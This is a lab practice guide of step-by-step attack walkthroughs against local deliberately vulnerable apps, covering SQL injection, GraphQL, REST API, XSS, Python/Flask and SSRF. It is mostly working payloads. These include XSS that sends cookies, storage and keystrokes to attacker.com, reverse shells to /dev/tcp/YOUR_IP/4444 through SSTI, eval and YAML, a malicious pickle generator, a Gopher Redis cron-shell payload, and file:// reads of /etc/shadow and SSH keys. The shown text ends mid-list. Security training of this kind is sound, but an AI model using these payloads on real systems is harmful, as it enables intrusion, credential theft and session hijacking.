# Advanced Practice Scenarios - New Vulnerable Applications

This document provides detailed, step-by-step practice scenarios for the newly added vulnerable applications. Each scenario includes learning objectives, prerequisites, and detailed walkthroughs.

---

## Table of Contents

1. [SQLi-Labs: Complete SQL Injection Mastery](#scenario-1-sqli-labs-complete-sql-injection-mastery)
2. [GraphQL API Security Testing](#scenario-2-graphql-api-security-testing)
3. [REST API Exploitation](#scenario-3-rest-api-exploitation)
4. [Advanced XSS Techniques with Pixi](#scenario-4-advanced-xss-techniques-with-pixi)
5. [Python/Flask Vulnerabilities](#scenario-5-pythonflask-vulnerabilities)
6. [SSRF Attack Scenarios](#scenario-6-ssrf-attack-scenarios)
7. [Business Logic Flaws in Banking](#scenario-7-business-logic-flaws-in-banking)
8. [Secrets Discovery with WrongSecrets](#scenario-8-secrets-discovery-with-wrongsecrets)
9. [E-commerce Exploitation](#scenario-9-e-commerce-exploitation)
10. [Complete API Hacking Challenge](#scenario-10-complete-api-hacking-challenge)

---

## Scenario 1: SQLi-Labs Complete SQL Injection Mastery

### Objective
Master SQL injection through progressive challenges, from basic extraction to advanced techniques.

### Prerequisites
- Lab running: `./lab.sh start`
- Access to SQLi-Labs: http://localhost:8091
- Basic SQL knowledge
- Web browser and proxy (Burp Suite recommended)

### Phase 1: Basic Injection (Lessons 1-10)

#### Lesson 1: GET - Error Based
```bash
# Access: http://localhost:8091/Less-1/

# Step 1: Test for injection
?id=1'  # Error - vulnerable!

# Step 2: Determine column count
?id=1' ORDER BY 1-- +    # Works
?id=1' ORDER BY 2-- +    # Works
?id=1' ORDER BY 3-- +    # Works
?id=1' ORDER BY 4-- +    # Error - 3 columns

# Step 3: Find visible columns
?id=-1' UNION SELECT 1,2,3-- +
# You'll see numbers 2 and 3 on the page

# Step 4: Extract database info
?id=-1' UNION SELECT 1,database(),version()-- +
# Database: dvwa
# Version: 5.x

# Step 5: Extract tables
?id=-1' UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_schema=database()-- +
# Tables: emails, referers, uagents, users

# Step 6: Extract columns from users
?id=-1' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- +
# Columns: id, username, password

# Step 7: Dump credentials
?id=-1' UNION SELECT 1,username,password FROM users-- +
# You'll see all usernames and passwords!
```

#### Lesson 2: GET - Integer Based
```bash
# No quotes needed
?id=1 ORDER BY 3-- +
?id=-1 UNION SELECT 1,2,3-- +
```

#### Lesson 3: GET - Error Based with Quotes
```bash
# Try different quote combinations
?id=1'  # Error
?id=1"  # No error - single quotes

# Payload
?id=-1' UNION SELECT 1,2,3-- +
```

#### Lesson 4: GET - Double Query
```bash
# When normal UNION doesn't work, use double query injection
?id=1'; INSERT INTO users VALUES(999, 'hacker', 'hacked')-- +

# Or extract data through error messages
?id=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT database()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- +
```

#### Lesson 5: GET - Double Injection - Single Quotes
```bash
# Extract database through error message
?id=1' AND 1=2 UNION SELECT 1,2,3 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,database(),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a-- +
```

### Phase 2: POST Injection (Lessons 11-15)

#### Lesson 11: POST - Error Based
```bash
# Use Burp Suite to intercept POST request
# Capture login form

# Payload in username field:
admin' UNION SELECT 1,2,3-- +

# Or extract data:
' UNION SELECT database(),version(),3-- +
```

#### Lesson 13: POST - Double Injection
```bash
# POST data in login form:
uname=admin' AND 1=2 UNION SELECT 1,2,3 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,database(),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a--+ &passwd=admin&submit=Submit
```

### Phase 3: Advanced Techniques (Lessons 18-25)

#### Lesson 18: Header Injection - User-Agent
```bash
# Intercept with Burp Suite
# Modify User-Agent header:

User-Agent: ' UNION SELECT 1,2,3-- +

# Or extract data:
User-Agent: ' UNION SELECT database(),version(),3-- +
```

#### Lesson 19: Header Injection - Referer
```bash
# Modify Referer header:
Referer: ' UNION SELECT 1,2,3-- +
```

#### Lesson 20: Header Injection - Cookie
```bash
# Modify Cookie:
Cookie: uname=' UNION SELECT 1,2,3-- +
```

#### Blind SQL Injection (Lessons 8-9)

##### Boolean-Based Blind
```bash
# Test true/false conditions
?id=1' AND 1=1-- +    # True - page loads normally
?id=1' AND 1=2-- +    # False - page changes

# Extract database name character by character
?id=1' AND LENGTH(database())=4-- +    # True (dvwa = 4 chars)

?id=1' AND SUBSTRING(database(),1,1)='d'-- +    # True
?id=1' AND SUBSTRING(database(),2,1)='v'-- +    # True

# Automated with sqlmap:
sqlmap -u "http://localhost:8091/Less-8/?id=1" --technique=B --dbs
```

##### Time-Based Blind
```bash
# When no visible changes, use time delays
?id=1' AND SLEEP(5)-- +
# If page takes 5 seconds to load, it's vulnerable

# Extract data character by character
?id=1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)-- +
# If first char is 'd', page will delay 5 seconds
```

### Complete SQLi-Labs Automation

```bash
# Use SQLMap for automated extraction

# Basic scan
sqlmap -u "http://localhost:8091/Less-1/?id=1" --batch --dbs

# Extract tables
sqlmap -u "http://localhost:8091/Less-1/?id=1" --batch -D dvwa --tables

# Dump columns
sqlmap -u "http://localhost:8091/Less-1/?id=1" --batch -D dvwa -T users --dump

# POST request
sqlmap -u "http://localhost:8091/Less-11/" --data="uname=admin&passwd=admin" --batch

# Header injection
sqlmap -u "http://localhost:8091/Less-18/" --level=5 --batch
```

### Learning Outcomes
- Manual SQL injection techniques
- UNION-based extraction
- Error-based exploitation
- Blind SQL injection (boolean and time-based)
- Header injection
- POST-based injection
- Database enumeration
- Automated exploitation with SQLMap

---

## Scenario 2: GraphQL API Security Testing

### Objective
Master GraphQL-specific security vulnerabilities and attack techniques.

### Prerequisites
- Lab running
- Damn Vulnerable GraphQL Application: http://localhost:8092
- GraphQL knowledge (basic)
- Postman or curl

### Phase 1: GraphQL Introspection

#### Step 1: Access GraphQL Playground
```bash
# Open GraphQL Playground
open http://localhost:8092/graphql

# Or use Altair GraphQL Client
# Or curl:
curl -X POST http://localhost:8092/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

#### Step 2: Full Schema Discovery
```graphql
# Query 1: Get all types
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# Query 2: Get query type definition
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

# Query 3: Check for mutations
{
  __schema {
    mutationType {
      fields {
        name
        description
      }
    }
  }
}
```

### Phase 2: GraphQL Injection Attacks

#### Attack 1: GraphQL Injection to Bypass Authentication
```graphql
# Query all users without authentication
{
  users {
    id
    username
    email
    password
    isActive
  }
}

# Query specific user by ID (IDOR vulnerability)
{
  user(id: 1) {
    id
    username
    email
    password
  }
}

# Enumerate all users by iterating through IDs
{
  user(id: 1) { username email }
  user(id: 2) { username email }
  user(id: 3) { username email }
}
```

#### Attack 2: Batching Attacks
```json
// Send multiple queries in single request
[
  {
    "query": "{ user(id: 1) { email } }"
  },
  {
    "query": "{ user(id: 2) { email } }"
  },
  {
    "query": "{ user(id: 3) { email } }"
  }
]

// Use with curl:
curl -X POST http://localhost:8092/graphql \
  -H "Content-Type: application/json" \
  -d @queries.json
```

#### Attack 3: Denial of Service via Nested Queries
```graphql
# Deeply nested query to cause DoS
{
  user(id: 1) {
    username
    friends {
      username
      friends {
        username
        friends {
          username
          friends {
            username
            friends {
              username
              friends {
                username
                friends {
                  username
                }
              }
            }
          }
        }
      }
    }
  }
}
```

#### Attack 4: Alias Overloading
```graphql
# Request same field multiple times with different arguments
{
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
  user4: user(id: 4) { email }
  user5: user(id: 5) { email }
}

# Or request massive amount of data:
{
  importantData: user(id: 1) {
    username
    email
    password
    ssn
    creditCard
  }
  data1: user(id: 1) { username email password }
  data2: user(id: 1) { username email password }
  data3: user(id: 1) { username email password }
  data4: user(id: 1) { username email password }
}
```

### Phase 3: GraphQL-specific Vulnerabilities

#### Vulnerability 1: Directive Bypass
```graphql
# Try using @include directive to bypass authorization
{
  user(id: 1) {
    username
    email @include(if: true)
    password @include(if: true)
  }
}

# Or @skip
{
  user(id: 1) {
    username
    email @skip(if: false)
  }
}
```

#### Vulnerability 2: Comment-based Bypass
```graphql
# Use comments to bypass validation
{
  user(id: 1) {
    username
    # comment to bypass checks
    password
  }
}
```

### Phase 4: Automated GraphQL Security Testing

```bash
# Using GraphQLmap (if available)
python graphqlmap.py -u http://localhost:8092/graphql

# Using Apollo GraphQL Audit
# Install npm package
npm install -g graphql-voyager
gql-voyager http://localhost:8092/graphql

# Manual brute force with Burp Suite:
# 1. Capture GraphQL request
# 2. Send to Intruder
# 3. Enumerate field names and IDs
# 4. Look for sensitive data exposure
```

### Practical Exploitation Example

```bash
# Complete GraphQL attack workflow:

# Step 1: Discover schema
curl -X POST http://localhost:8092/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'

# Step 2: Extract all users
curl -X POST http://localhost:8092/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username email password } }"}'

# Step 3: Access specific user data
curl -X POST http://localhost:8092/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { username email password ssn } }"}'

# Step 4: Perform DoS
curl -X POST http://localhost:8092/graphql \
  -H "Content-Type: application/json" \
  -d @nested_payload.graphql
```

### Learning Outcomes
- GraphQL schema discovery through introspection
- Authentication bypass in GraphQL
- IDOR vulnerabilities in GraphQL APIs
- GraphQL-specific DoS attacks
- Batching and alias attacks
- Automated GraphQL security testing

---

## Scenario 3: REST API Exploitation

### Objective
Master REST API security testing through Damn Vulnerable RESTaurant API.

### Prerequisites
- Damn Vulnerable RESTaurant API: http://localhost:8093
- API testing tool (Postman, curl, or Burp Suite)
- Basic REST API knowledge

### Phase 1: API Discovery and Reconnaissance

#### Step 1: Explore API Endpoints
```bash
# Check for API documentation
curl http://localhost:8093/api-docs
curl http://localhost:8093/swagger.json
curl http://localhost:8093/openapi.json

# Common endpoints to try:
curl http://localhost:8093/api/v1/
curl http://localhost:8093/api/v1/health
curl http://localhost:8093/api/v1/users
curl http://localhost:8093/api/v1/menu
curl http://localhost:8093/api/v1/orders
```

#### Step 2: Directory Brute Force
```bash
# Find hidden endpoints
gobuster dir -u http://localhost:8093/api -w /usr/share/wordlists/api-endpoints.txt
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/api-endpoints.txt http://localhost:8093/FUZZ
```

### Phase 2: Authentication Bypass

#### Attack 1: Default Credentials
```bash
# Try common default credentials
POST /api/v1/auth/login
{
  "username": "admin",
  "password": "admin"
}

POST /api/v1/auth/login
{
  "username": "admin",
  "password": "password"
}

POST /api/v1/auth/login
{
  "username": "test",
  "password": "test"
}
```

#### Attack 2: SQL Injection in Login
```bash
POST /api/v1/auth/login
{
  "username": "admin' --",
  "password": "anything"
}

# Or JSON-based injection:
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

#### Attack 3: JWT Manipulation
```bash
# Capture JWT token from response
# Decode with: jwt.io or jwt_tool

# Try None algorithm:
jwt_tool <TOKEN> -X n

# Try to escalate privileges:
jwt_tool <TOKEN> -I -pc role -pv admin

# Forge admin token:
echo '{"alg":"none","typ":"JWT"}' | base64
echo '{"user":"admin","role":"admin"}' | base64
echo '.' # Empty signature
# Combine: header.payload.signature
```

### Phase 3: Authorization Flaws

#### Attack 1: IDOR (Insecure Direct Object Reference)
```bash
# Access other users' orders
GET /api/v1/orders/1  # Not your order!
GET /api/v1/orders/2
GET /api/v1/orders/3

# Access other users' profiles
GET /api/v1/users/1
GET /api/v1/users/2

# Modify request: change order ID
# As regular user, access admin's account:
GET /api/v1/admin/users/1  # Should not be accessible!
```

#### Attack 2: Privilege Escalation
```bash
# Regular user tries to access admin endpoints
GET /api/v1/admin/dashboard
GET /api/v1/admin/users
POST /api/v1/admin/promote  # Promote yourself to admin

# Manipulate role in requests:
POST /api/v1/users/update
{
  "user_id": "your_user_id",
  "role": "admin"  # Escalate privileges
}
```

### Phase 4: API-Specific Vulnerabilities

#### Attack 1: Mass Assignment
```bash
# Try to set unexpected fields
POST /api/v1/users/register
{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "password123",
  "role": "admin",              # Mass assignment!
  "is_admin": true,            # More mass assignment!
  "credits": 999999
}
```

#### Attack 2: Parameter Pollution
```bash
# Send same parameter multiple times
GET /api/v1/users?id=1&id=2&id=3
GET /api/v1/orders?sort=asc&sort=desc

# Array manipulation
POST /api/v1/orders/create
{
  "items": [1, 2, 3],
  "items": [100, 200],  # Override
  "price": -100  # Negative price!
}
```

#### Attack 3: Rate Limiting Bypass
```bash
# Test rate limits:
for i in {1..100}; do
  curl http://localhost:8093/api/v1/health
done

# Bypass techniques:
# 1. Change IP headers:
curl -H "X-Forwarded-For: 1.2.3.4" http://localhost:8093/api/v1/health
curl -H "X-Real-IP: 1.2.3.4" http://localhost:8093/api/v1/health

# 2. Use different User-Agents
curl -A "Bot1" http://localhost:8093/api/v1/health
curl -A "Bot2" http://localhost:8093/api/v1/health

# 3. Add random parameters:
curl "http://localhost:8093/api/v1/health?rand=123"
curl "http://localhost:8093/api/v1/health?rand=456"
```

#### Attack 4: CORS Misconfiguration
```bash
# Check CORS headers
curl -H "Origin: http://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -H "Access-Control-Request-Headers: Content-Type" \
     -X OPTIONS \
     http://localhost:8093/api/v1/users

# If Access-Control-Allow-Origin: http://evil.com
# You can exploit from your evil.com site:
# <script>
# fetch('http://localhost:8093/api/v1/users', {
#   credentials: 'include'
# }).then(r => r.text()).then(console.log)
# </script>
```

### Phase 5: Business Logic Flaws

#### Attack 1: Price Manipulation
```bash
# Intercept order creation and modify prices
POST /api/v1/orders
{
  "items": [1, 2, 3],
  "total": -100,        # Negative total!
  "discount": 0.99      # 99% discount
}

# Or modify item prices:
POST /api/v1/orders
{
  "items": [
    {"id": 1, "price": 0.01},   # Was $10.00
    {"id": 2, "price": 0.01}
  ]
}
```

#### Attack 2: Coupon Abuse
```bash
# Reuse single-use coupon
POST /api/v1/orders
{
  "items": [1, 2],
  "coupon": "SAVE50"
}

# Send second request immediately (race condition)
POST /api/v1/orders
{
  "items": [3, 4],
  "coupon": "SAVE50"  # Reused!
}

# Stack coupons:
POST /api/v1/orders
{
  "items": [1, 2],
  "coupons": ["SAVE50", "SAVE30", "SAVE20"]  # Stack them!
}
```

### Phase 6: Automated API Testing

```bash
# Using OWASP ZAP API:
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://localhost:8093/api

# Using Postman collections:
# Create collection with all endpoints
# Run automated tests with Newman:
newman run api-tests.json

# Using Arjun for parameter discovery:
arjun -u http://localhost:8093/api/v1/users -wT

# Using Nuclei with API templates:
nuclei -u http://localhost:8093 -t /path/to/api-templates
```

### Learning Outcomes
- API reconnaissance and endpoint discovery
- Authentication bypass in REST APIs
- JWT manipulation
- IDOR vulnerabilities
- Mass assignment attacks
- Parameter pollution
- Rate limiting bypass
- CORS exploitation
- Business logic flaws
- Automated API security testing

---

## Scenario 4: Advanced XSS Techniques with Pixi

### Objective
Master all types of XSS attacks and bypass techniques.

### Prerequisites
- Pixi: http://localhost:8094
- Understanding of HTML/JavaScript
- Web browser with developer tools

### Phase 1: Reflected XSS

#### Challenge 1: Basic Reflected XSS
```bash
# Access Pixi
open http://localhost:8094

# Try basic payloads:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Test in search input, URL parameters, forms
```

#### Challenge 2: Filter Bypass - Case Variation
```javascript
// When basic tags are blocked
<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=x ONERROR=alert('XSS')>
<SVg oNlOaD=alert('XSS')>

// Mix cases:
<ScRiPt>AlErT('XSS')</sCrIpT>
```

#### Challenge 3: Filter Bypass - Encoding
```javascript
// URL encoding
%3Cscript%3Ealert('XSS')%3C/script%3E

// Double encoding
%253Cscript%253Ealert('XSS')%253C/script%253E

// Unicode encoding
\u003Cscript\u003Ealert('XSS')\u003C/script\u003E

// Hex encoding
\x3Cscript\x3Ealert('XSS')\x3C/script\x3E
```

#### Challenge 4: Context-Specific Payloads

##### HTML Context
```html
<!-- Direct injection into HTML -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<details open ontoggle=alert('XSS')>
```

##### Attribute Context
```html
<!-- Injected into attribute value -->
" onmouseover="alert('XSS')
" onfocus=alert('XSS') autofocus="
" autofocus onfocus=alert('XSS') x="
"><script>alert('XSS')</script>
```

##### JavaScript Context
```javascript
// Injected into JavaScript code
'-alert('XSS')-'
';alert('XSS');//
\';alert('XSS');//

// Break out and execute
</script><script>alert('XSS')</script>
```

##### CSS Context
```css
/* Injected into CSS */
</style><script>alert('XSS')</script><style>
x;expr/**/ession(alert('XSS'))
x:expression(alert('XSS'))
```

### Phase 2: Stored XSS

#### Attack 1: Profile-Based Stored XSS
```javascript
// Inject into user profile
Name: <script>alert('XSS')</script>
Bio: <img src=x onerror=alert('XSS')>

// Triggered when anyone views your profile
```

#### Attack 2: Comment-Based Stored XSS
```javascript
// Inject into comments/reviews
Comment: <script>document.location='http://attacker.com/?c='+document.cookie</script>

// More stealthy:
Comment: <img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

#### Attack 3: Multi-Vector Stored XSS
```javascript
// Try different input fields
1. Username field
2. Email field
3. Website/URL field
4. Bio/About field
5. Profile picture URL
6. Location field

// Some might be sanitized, others not
```

### Phase 3: DOM XSS

#### Attack 1: URL Parameter-Based
```javascript
// When page reads from URL hash and writes to DOM using innerHTML
# Vulnerable: <div>location.hash</div>

# Payload:
#<img src=x onerror=alert('XSS')>

# Or:
#<script>alert('XSS')</script>
```

#### Attack 2: Source-Based DOM XSS
```javascript
// Vulnerable: document.location, document.URL, etc.
# Exploit URL parameters:
?param=<script>alert('XSS')</script>

# Exploit fragment:
#param=<img src=x onerror=alert('XSS')>
```

#### Attack 3: Sink-Based DOM XSS
```javascript
// When user input flows to dangerous sinks:
- eval()
- setTimeout()
- setInterval()
- Function()
-.innerHTML
- outerHTML

# Examples:
?param=eval('alert("XSS")')
?param=setTimeout('alert("XSS")')
```

### Phase 4: Advanced Bypass Techniques

#### Bypass 1: WAF/Filter Evasion
```javascript
// Polyglot XSS
javascript:///*<script*/alert('XSS')</script>

// Tag confusion
<svg><script>alert('XSS')</script>

// Null bytes
<script%00>alert('XSS')</script>

// Newline characters
<script%0a>alert('XSS')</script>
<script%0d>alert('XSS')</script>

// Tab characters
<script%09>alert('XSS')</script>
```

#### Bypass 2: Content Security Policy (CSP) Bypass
```javascript
// If CSP is restrictive:

// Try 'unsafe-inline' bypass
<script>'alert("XSS")</script>

// Try data: scheme
<img src="data:text/javascript,alert('XSS')">

// Try eval-like functions
setTimeout('alert("XSS")')
setInterval('alert("XSS")')
Function('alert("XSS")')()
```

#### Bypass 3: Framework-Specific
```javascript
// AngularJS template injection:
{{constructor.constructor('alert("XSS")')()}}

// Vue.js template injection:
{{this.constructor.constructor('alert("XSS")')()}}

// React-based:
<div dangerouslySetInnerHTML={{__html: "alert('XSS')"}} />
```

### Phase 5: Cookie Theft & Session Hijacking

```javascript
// Steal cookies
<script>
fetch('http://attacker.com:8000/?cookie='+document.cookie)
</script>

// More stealthy:
<script>
var i = new Image();
i.src = 'http://attacker.com:8000/?c=' + document.cookie;
</script>

// Steer localStorage:
<script>
var data = JSON.stringify(localStorage);
fetch('http://attacker.com:8000/?data=' + encodeURIComponent(data));
</script>

// Steer sessionStorage:
<script>
var session = JSON.stringify(sessionStorage);
fetch('http://attacker.com:8000/?session=' + encodeURIComponent(session));
</script>
```

### Phase 6: Advanced XSS Attacks

#### Attack 1: XSS Phishing
```javascript
// Inject fake login form
<script>
document.body.innerHTML = '<form action="http://attacker.com/steal.php" method="POST">Username: <input type="text" name="user"><br>Password: <input type="password" name="pass"><br><button type="submit">Login</button></form>';
</script>
```

#### Attack 2: Keylogging
```javascript
<script>
document.addEventListener('keydown', function(e) {
  fetch('http://attacker.com:8000/?key=' + e.key);
});
</script>
```

#### Attack 3: Browser Exploitation
```javascript
// Scan internal network:
<script>
fetch('http://192.168.1.1', {mode: 'no-cors'})
  .then(() => console.log('Router found!'));
</script>

// Port scanning:
<script>
for(let port = 1; port <= 100; port++) {
  fetch('http://localhost:' + port, {mode: 'no-cors'})
    .then(() => console.log('Port ' + port + ' is open'));
}
</script>
```

### Learning Outcomes
- Reflected, stored, and DOM XSS
- Context-specific payloads
- Filter bypass techniques
- WAF evasion
- CSP bypass
- Cookie theft and session hijacking
- XSS phishing
- Keylogging
- Browser-based attacks
- Network scanning from browser

---

## Scenario 5: Python/Flask Vulnerabilities

### Objective
Master Python-specific web vulnerabilities through PyGoat.

### Prerequisites
- PyGoat: http://localhost:8095
- Basic Python knowledge
- Understanding of web frameworks

### Phase 1: Server-Side Template Injection (SSTI)

#### Attack 1: Jinja2 SSTI Detection
```python
# Test for SSTI in Jinja2 (Flask)
{{7*7}}  # If you see 49, it's vulnerable
{{config}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}  # List all subclasses
```

#### Attack 2: Jinja2 RCE
```python
# Find subprocess class
{{''.__class__.__mro__[1].__subclasses__()[104]}}

# Execute commands
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}

# Reverse shell payload
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1').read()}}
```

#### Attack 3: Alternative SSTI Payloads
```python
# Method 1:
{% for c in [1,2,3] %}{{c.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}{% endfor %}

# Method 2:
{{config.items()}}
{{config.from_pyimport('os').popen('id').read()}}

# Method 3:
{{get_flashed_messages.__globals__['os'].popen('id').read()}}
```

### Phase 2: Python Code Injection

#### Attack 1: Eval Injection
```python
# When code uses eval() on user input
# Input:
__import__('os').system('id')

# Or:
__import__('subprocess').check_output(['ls', '-la'], shell=True)
```

#### Attack 2: Exec Injection
```python
# When code uses exec() on user input
# Input:
import os; os.system('id')

# Or:
__import__('os').system('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')
```

### Phase 3: Python Pickle Deserialization

#### Attack 1: Create Malicious Pickle
```python
# Create exploit.py
import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

# Create malicious pickle
payload = pickle.dumps(Exploit())

# Encode to base64 for transport
encoded = base64.b64encode(payload)
print(encoded.decode())
```

#### Attack 2: Send Malicious Pickle
```bash
# Use the encoded payload in cookie/session/token
# Or via file upload
# Or via any deserialization point

# Example: Set in cookie
curl -b "session=<BASE64_PAYLOAD>" http://localhost:8095/vulnerable_endpoint
```

### Phase 4: Format String Vulnerabilities

#### Attack 1: Information Disclosure
```python
# When user input goes into format string
# Input:
{__doc__}
{config.__dict__}
{os.environ}

# Read sensitive data:
{os.environ['DATABASE_URL']}
{os.environ['SECRET_KEY']}
```

#### Attack 2: Format String RCE
```python
# More advanced format string exploitation
{os.system('id')}
{__import__('os').system('id')}

# Or use .__format__
{os.__class__.__init__.__globals__['system']('id')}
```

### Phase 5: YAML Deserialization

#### Attack 1: Malicious YAML
```yaml
# Create malicious.yaml
!!python/object/apply:os.system
args: ['id']

# Or:
!!python/object/new:os.system
args: ['bash -i >& /dev/tcp/YOUR_IP/4444 0>&1']
```

### Phase 6: Flask-Specific Vulnerabilities

#### Attack 1: Session Forgery
```python
# Flask uses signed cookies by default
# If SECRET_KEY is weak or leaked:

# Install flask-unsign
pip install flask-unsign

# Decode cookie:
flask-unsign --decode --cookie 'eyJjb250ZW50IjoiYWRtaW4ifQ.YXXXXXXX'

# Brute force secret key:
flask-unsign --unsign --cookie 'eyJjb250ZW50IjoiYWRtaW4ifQ.YXXXXXXX' \
  --wordlist /usr/share/wordlists/rockyou.txt

# Forge new cookie:
flask-unsign --sign --cookie "{'content': 'admin', 'role': 'admin'}" \
  --secret 'your-secret-key'
```

#### Attack 2: Debug Mode Exploitation
```python
# If debug mode is enabled:
# Access /console endpoint
# Use PIN to execute arbitrary Python code

# Or exploit Werkzeug debugger:
/__debugger__?cmd=__import__('os').popen('id').read()
```

### Phase 7: Python Dependency Vulnerabilities

#### Attack 1: Vulnerable Libraries
```bash
# Check for known vulnerable dependencies
pip install safety
safety check

# Or use pip-audit
pip install pip-audit
pip-audit
```

### Learning Outcomes
- Server-Side Template Injection (SSTI)
- Jinja2/Flask template injection
- Python code injection
- Pickle deserialization attacks
- Format string vulnerabilities
- YAML deserialization
- Flask session forgery
- Debug mode exploitation
- Python security best practices

---

## Scenario 6: SSRF Attack Scenarios

### Objective
Master Server-Side Request Forgery attacks with the SSRF Lab.

### Prerequisites
- SSRF Lab: http://localhost:8096
- Understanding of HTTP requests
- Network fundamentals

### Phase 1: Basic SSRF Detection

#### Test 1: Identify SSRF Entry Points
```bash
# Look for features that fetch URLs:
- "Import from URL"
- "Fetch metadata"
- "Webhook tester"
- "File upload via URL"
- "Image loader from URL"
- "XML/JSON import"

# Test with external service:
# Setup listener:
nc -lvnp 80

# Try to trigger request to your server:
http://attacker.com/
http://YOUR_IP/
```

#### Test 2: Confirm SSRF
```bash
# Use Burp Collaborator or similar:
# 1. Get a unique URL from Burp Collaborator
# 2. Submit it to the application
# 3. Check if DNS/HTTP request was received

# Or use requestbin.fullcontact.com
# Or use ngrok for local testing
```

### Phase 2: Internal Port Scanning

#### Scan 1: Basic Port Scan
```bash
# Scan common internal ports:
http://localhost:22
http://localhost:3306
http://localhost:6379
http://localhost:27017
http://localhost:8080
http://localhost:8081
http://localhost:8090

# Check response differences:
# - Connection refused = port closed
# - Timeout = port likely open (filtering)
# - Protocol response = port open
```

#### Scan 2: Advanced Port Scanning
```bash
# Scanning loop (if multiple SSRF points):
for port in {1..1000}; do
  curl "http://localhost:$port" &
done

# Or use ffuf:
ffuf -w ports.txt -u "http://localhost:FUZZ" -mc all
```

### Phase 3: Cloud Metadata Attacks

#### Attack 1: AWS Metadata
```bash
# Access AWS instance metadata:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
http://169.254.169.254/latest/user-data
```

#### Attack 2: GCP Metadata
```bash
# Google Cloud Platform:
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
```

#### Attack 3: Azure Metadata
```bash
# Azure:
http://169.254.169.254/metadata/
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/identity
```

### Phase 4: File Protocol Exploitation

#### Attack 1: Read Local Files
```bash
# If file:// protocol is supported:
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/log/apache2/access.log
file:///home/user/.ssh/id_rsa
file:///etc/apache2/sites-available/000-default.conf

# Windows:
file:///C:/Windows/win.ini
file:///C:/boot.ini
file:///C:/inetpub/wwwroot/web.config
```

#### Attack 2: Read Application Code
```bash
# Read source code:
file:///var/www/html/index.php
file:///var/www/html/config.php
file:///var/www/html/.env
file:///var/www/html/flag.txt
```

### Phase 5: Blind SSRF Exploitation

#### Technique 1: Out-of-Band (OOB) Detection
```bash
# Use Burp Collaborator:
# 1. Generate collaborator URL
# 2. Submit to vulnerable parameter
# 3. Monitor for DNS/HTTP/SMTP requests

# Or use Interactsh:
interactsh-client -pol
# Submit generated URL
```

#### Technique 2: Time-Based Detection
```bash
# Delay responses to infer success:
# Use services that delay:
http://httpbin.org/delay/10  # 10 second delay

# If page takes 10 seconds longer, SSRF is confirmed
```

### Phase 6: SSRF to RCE

#### Attack 1: Redis Exploitation
```bash
# If Redis is accessible (port 6379):
# 1. Send Gopher payload to Redis
# 2. Write SSH key to /root/.ssh/authorized_keys

# Gopher payload for Redis:
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$21%0d%0a%0a%0a%0a*/1%20*%20*%20*%20bash%20-i%20>%26%20/dev/tcp/YOUR_IP/4444%200>%261%0a%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

#### Attack 2: FastCGI Exploitation
```bash
# Use FastCGI protocol via Gopher:
# Install fgmp (FastCGI Gopher Script)
python fgmp.py 127.0.0.1 9000 /var/www/html/index.php

# Or use Gopherus:
python Gopherus.py exp fastcgi /var/www/html/index.php
```

### Phase 7: Advanced SSRF Bypasses

#### Bypass 1: Filter Evasion
```bash
# When 'localhost' is blocked:
127.0.0.1
0.0.0.0
0177.0.0.1
127.1
127.0.1
2130706433  # Decimal IP
0x7f000001  # Hex IP
::1
localhost.localdomain
